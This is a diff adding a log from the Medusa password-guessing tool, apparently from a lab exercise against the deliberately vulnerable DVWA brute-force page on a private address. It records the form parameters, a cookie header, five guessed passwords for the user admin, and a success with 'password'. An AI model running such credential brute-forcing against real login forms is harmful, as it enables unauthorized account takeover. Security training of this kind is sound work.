@@ -1,0 +1,17 @@
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+GENERAL: Module parameter: FORM:dvwa/vulnerabilities/brute/
+GENERAL: Module parameter: FORM-DATA:get?username=&password=&Login=Login
+GENERAL: Module parameter: DENY-SIGNAL:Username and/or password incorrect.
+GENERAL: Module parameter: CUSTOM-HEADER:Cookie: PHPSESSID=[OCULTO]; security=low
+GENERAL: Parallel Hosts: 1 Parallel Logins: 1
+GENERAL: Total Hosts: 1 
+GENERAL: Total Users: 1
+GENERAL: Total Passwords: 5
+2026-10-21 17:12:58 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: 123456 (1 of 5 complete)
+2026-10-21 17:12:58 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: admin123 (2 of 5 complete)
+2026-10-21 17:12:58 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: kali (3 of 5 complete)
+2026-10-21 17:12:58 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: msfadmin (4 of 5 complete)
+2026-10-21 17:12:58 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: password (5 of 5 complete)
+2026-10-21 17:12:58 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: admin Password: password [SUCCESS]
+GENERAL: Medusa has finished.
